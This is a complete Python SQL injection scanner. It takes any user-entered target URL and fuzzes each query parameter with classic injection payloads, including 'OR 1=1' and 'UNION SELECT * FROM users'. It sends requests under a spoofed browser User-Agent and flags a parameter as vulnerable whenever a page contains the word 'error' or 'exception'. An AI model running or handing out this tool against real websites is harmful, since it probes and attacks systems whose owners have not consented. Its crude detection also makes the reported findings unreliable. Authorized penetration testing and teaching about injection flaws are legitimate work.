import requests
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

def check_sql_injection(url, payloads):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'}

    # Parse the URL to extract parameters
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    vulnerable_parameters = []
    for param_name, param_values in query_params.items():
        for param_value in param_values:
            print(f"Testing SQL injection for {param_name} parameter...")

            for payload in payloads:
                fuzzed_params = {key: value[0] if key != param_name else payload for key, value in query_params.items()}
                fuzzed_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, urlencode(fuzzed_params), parsed_url.fragment))
                try:
                    response = requests.get(fuzzed_url, headers=headers)
                    if "error" in response.text.lower() or "exception" in response.text.lower():
                        print(f"SQL injection vulnerability found on {fuzzed_url} with payload: {payload}")
                        vulnerable_parameters.append(param_name)
                        break
                except Exception as e:
                    print(f"Error occurred while testing {fuzzed_url}: {str(e)}")

    if vulnerable_parameters:
        print("Website is vulnerable to SQL injection in the following parameters:")
        for param in vulnerable_parameters:
            print(f"- {param}")
    else:
        print("Website is not vulnerable to SQL injection (or vulnerabilities were not found with the provided payloads).")

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    sql_injection_payloads = [
        "' OR 1=1 --",
        "' UNION SELECT * FROM users --",
        "' AND '1'='1",
        "'+OR+1=1+--",
        "83854282' or '1256'='1256"
    ]


    check_sql_injection(target_url, sql_injection_payloads)